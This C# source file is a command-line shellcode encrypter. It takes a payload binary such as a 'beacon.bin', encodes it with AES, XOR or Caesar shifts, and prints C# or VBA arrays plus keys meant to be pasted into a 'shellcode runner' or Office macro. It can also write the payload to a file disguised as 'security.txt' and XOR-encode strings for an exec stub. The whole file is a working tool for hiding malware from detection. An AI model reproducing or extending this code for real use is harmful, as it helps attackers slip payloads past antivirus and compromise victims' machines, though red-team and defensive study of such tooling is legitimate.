using CommandLine;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ShellcodeEncrypter
{
    class Program
    {
        private static readonly byte[] Salt = new byte[] { 15, 25, 35, 45, 55, 65, 75, 85 };

        class Options
        {
            [Option('i', "input", Required = true, HelpText = "Input file to be processed (e.g. beacon.bin).")]
            public string inputBin { get; set; }

            [Option('m', "mode", Required = true, HelpText = "Encryption/encoding mode (aesCs,caesarCs,caesarVba,xorCs,xorCsString)")]
            public string encMode { get; set; }

            [Option('r', "resource", Required = false,Default = false, HelpText = "Output as an embeded resource file (default is copy and paste code)")]
            public bool outAsResource { get; set; }

        }
        static void Main(string[] args)
        {

            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o =>
                {
                    Console.WriteLine("[>] Initializing...");
                    Console.WriteLine("[>] Mode: " + o.encMode);

                    if (o.encMode.Equals("xorcsstring", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("[>] Input mode: string");
                        XorCsharpString(o.inputBin);
                    } 
                    else
                    {
                        Console.WriteLine("[>] Input mode: bin");

                        //ensure bin file exists
                        if (!File.Exists(o.inputBin))
                        {
                            Console.WriteLine("[!] Error: input bin does not exist");
                            return;
                        }

                        Console.WriteLine("[>] Reading bytes from: " + o.inputBin);
                        byte[] buf = File.ReadAllBytes(o.inputBin);

                        Console.WriteLine("[>] Bytes read: " + buf.Length);
                        if (o.encMode.Equals("aescs", StringComparison.OrdinalIgnoreCase))
                        {
                            AesCsharp(buf, o.outAsResource);
                        }
                        else if (o.encMode.Equals("caesarvba", StringComparison.OrdinalIgnoreCase))
                        {
                            CaesarVBA(buf);
                        }
                        else if (o.encMode.Equals("caesarcs", StringComparison.OrdinalIgnoreCase))
                        {
                            CaesarCsharp(buf, o.outAsResource);
                        }
                        else if (o.encMode.Equals("xorcs", StringComparison.OrdinalIgnoreCase))
                        {
                            XORCsharp(buf, o.outAsResource);
                        }
                        else
                        {
                            Console.WriteLine("[!] error: unknown encryption mode");
                        }
                    }
                    
                });

            return;
        }
        /*
         * --- Utilities
         */
        private static string RandString(int length)
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[length];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            var finalString = new String(stringChars);
            return finalString;
        }
        private static byte[] CreateKey(string password, int keyBytes = 32)
        {
            const int Iterations = 300;
            var keyGenerator = new Rfc2898DeriveBytes(password, Salt, Iterations);
            return keyGenerator.GetBytes(keyBytes);
        }

        private static string ToHex(byte[] data)
        {
            StringBuilder hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            return hex.ToString().Remove(hex.ToString().Length - 2);
        }
        private static string ToHexString(byte[] data)
        {
            StringBuilder hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                //hex.AppendFormat("0x{0:x2}, ", b);
                hex.AppendFormat("{0:x2}", b);
            }
            return hex.ToString();
        }
        private static string XOR(string input, string key)
        {
            var kL = key.Length;

            StringBuilder output = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
                output.Append((char)(input[i] ^ key[(i % key.Length)]));
            String result = output.ToString();

            return result;
        }
        /*
         * --- Csharp
         */
        private static void XORCsharp(byte[] buf, bool asResource)
        {
            var key = RandString(28);
            var kL = key.Length;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ (byte)key[i % kL]);
            }


            var csOut = "";
            if (asResource)
            {
                string outfile = "security.txt";
                File.WriteAllBytes(outfile, buf);
                Console.WriteLine("[>] Output file: " + outfile);
            } else {
                csOut = "byte[] encryptedShellcode = new byte[] {" + ToHex(buf) + "};";
            }


            Console.WriteLine("[>] Copy & paste into shellcode runner");
            Console.WriteLine("-----");
            if (!asResource)
            {
                Console.WriteLine(csOut);
                Console.WriteLine();
            }

            Console.WriteLine("string key = \""+key+"\";");
            Console.WriteLine("-----");
        }    
        private static void AesCsharp(byte[] buf, bool asResource)
        {
            Aes encryptor = Aes.Create();
            encryptor.Mode = CipherMode.CBC;
            encryptor.KeySize = 256;
            encryptor.BlockSize = 128;
            encryptor.Padding = PaddingMode.Zeros;

            //byte[] buf = new byte[< size >] { < payload > };
            //encryptor.Key = CreateKey("secret");
            encryptor.Key = CreateKey(RandString(28));
            encryptor.IV = CreateKey("iv", 16);

            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform aesEncryptor = encryptor.CreateEncryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesEncryptor, CryptoStreamMode.Write);
            cryptoStream.Write(buf, 0, buf.Length);
            cryptoStream.FlushFinalBlock();
            byte[] encoded = memoryStream.ToArray();

            var csOut = "";
            if (asResource)
            {
                string outfile = "security.txt";
                File.WriteAllBytes(outfile, encoded);
                Console.WriteLine("[>] Output file: " + outfile);
            }
            else
            {
                csOut = "byte[] encryptedShellcode = new byte[] {" + ToHex(encoded) + "};";
            }

            Console.WriteLine("[>] Copy & paste into shellcode runner");
            Console.WriteLine("-----");
            if (!asResource)
            {
                Console.WriteLine(csOut);
                Console.WriteLine();
            }
            Console.WriteLine("byte[] iv = new byte[" + encryptor.IV.Length + "] {" + ToHex(encryptor.IV) + "};");
            Console.WriteLine("byte[] key = new byte[" + encryptor.Key.Length + "] {" + ToHex(encryptor.Key) + "};");
            Console.WriteLine("-----");
            Console.WriteLine("[>] Thanks to @xct_de");
        }
        private static void XorCsharpString(string strInput)
        {
            Console.WriteLine("[>] Encrypting string: " + strInput);

            string[] pTextArr;

            // parse input
            if (strInput.Contains(","))
            {
                pTextArr = strInput.Split(",".ToCharArray());
            }
            else
            {
                List<string> list = new List<string>();
                list.Add(strInput);
                pTextArr = list.ToArray();
            }

            Console.WriteLine("[>] encrypting " + pTextArr.Length + " entries");

            // generate a key
            var key = RandString(28);

            Console.WriteLine("[>] key: " + ToHex(Encoding.Default.GetBytes(key)));
            Console.WriteLine("[>] exec stub:\n");

            // process
            foreach (string pText in pTextArr)
            {
                Console.WriteLine("//  " + pText);

                string eText = XOR(pText, key);

                string dText = XOR(eText, key);

                Console.WriteLine("Deflate(FromHex(\"" + ToHexString(Encoding.Default.GetBytes(eText)) + "\"),FromHex(\"" + ToHexString(Encoding.Default.GetBytes(key)) + "\"));");
            }
        }
        private static void CaesarCsharp(byte[] buf, bool asResource)
        {
            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {

                hex.AppendFormat("0x{0:x2}, ", b);
            }

            var csOut = "";
            if (asResource)
            {
                string outfile = "security.txt";
                File.WriteAllBytes(outfile, encoded);
                Console.WriteLine("[>] Output file: " + outfile);
            }
            else
            {
                csOut = "byte[] encryptedShellcode = new byte[] {" + hex.ToString().Remove(hex.Length - 2) + "};";
                Console.WriteLine("[>] Copy & paste into shellcode runner");
                Console.WriteLine("-----");
                Console.WriteLine(csOut);
                Console.WriteLine("-----");
            }

            return;
        }
        /*
         * --- VBA
         */
        private static void CaesarVBA(byte[] buf)
        {
            // hard coded for now
            bool outVba = true;

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                if (outVba)
                {
                    hex.AppendFormat("{0:D}, ", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                counter++;

                if (outVba)
                {
                    if (counter % 50 == 0)
                    {
                        hex.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
            }

            if (outVba)
            {
                Console.WriteLine("The payload is:\n" + "buf = Array(" +
                    hex.ToString().Remove(hex.Length - 2) + ")");
            }
            else
            {
                Console.WriteLine("The payload is:\n" + "byte[] buf = new byte[" +
                    encoded.Length + "] { " + hex.ToString().Remove(hex.Length - 2) + " };");
            }

            return;
        }
    }
}
